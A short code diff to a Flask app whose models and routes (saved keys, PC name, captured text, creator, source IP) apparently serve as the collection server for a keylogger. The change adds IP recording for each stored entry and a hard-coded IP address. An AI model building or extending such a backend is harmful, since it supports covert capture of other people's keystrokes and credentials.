@@ -17,7 +17,7 @@ def home():
 @app.route('/save/<id>')
 def tsave(id):
     save = Save_keys.query.get(id)
-    return render_template('save.html', save=save)
+    return render_template('save.html', save=save, ip='170.83.102.234')
 
 
 @app.route('/teclasalvas')
@@ -49,8 +49,6 @@ def download():
 @app.route('/add', methods=['POST'])
 def add():
     body = request.get_json()
-    
-    print(body)
 
     for p in ('pcname', 'texto'):
         if p not in body:
@@ -58,8 +56,11 @@ def add():
     
     if 'criador' not in body:   
         body['criador'] = 'Anonymo'
-
-    me = Save_keys(body['pcname'], body['texto'], datetime.now(), body['criador'])
+    
+    if 'ip' not in body:
+        body['ip'] = None
+    
+    me = Save_keys(pcname=body['pcname'], texto=body['texto'], data=datetime.now(), criador=body['criador'], ip=body['ip'])
     db.session.add(me)
     db.session.commit()
 
